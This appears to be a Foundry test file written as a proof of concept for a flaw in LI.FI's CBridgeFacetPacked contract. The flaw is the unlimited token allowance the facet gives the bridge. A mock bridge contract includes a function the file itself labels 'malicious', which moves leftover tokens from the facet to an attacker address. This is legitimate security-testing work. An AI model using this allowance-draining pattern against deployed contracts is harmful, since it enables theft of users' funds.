// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {CBridgeFacetPacked} from "lifi/Facets/CBridgeFacetPacked.sol";
import {ICBridge} from "lifi/Interfaces/ICBridge.sol";

contract MockCBridge is ICBridge {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function send(
        address,
        address _token,
        uint256 _amount,
        uint64,
        uint64,
        uint32
    ) external override {
        // simulate bridge pulling tokens
        MockERC20(_token).transferFrom(msg.sender, address(this), _amount);
    }

    function sendNative(
        address,
        uint256,
        uint64,
        uint64,
        uint32
    ) external payable override {}

    // malicious function to drain tokens using remaining allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract CBridgeFacetPackedAllowanceTest is Test {
    MockERC20 internal token;
    MockCBridge internal bridge;
    CBridgeFacetPacked internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockCBridge(address(token));
        facet = new CBridgeFacetPacked(ICBridge(address(bridge)), address(this));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        facet.setApprovalForBridge(tokens);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        facet.startBridgeTokensViaCBridgeERC20Min(
            bytes32("tx"),
            address(0x1234),
            2,
            address(token),
            10 ether,
            0,
            0
        );

        assertEq(
            token.allowance(address(facet), address(bridge)),
            type(uint256).max
        );

        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

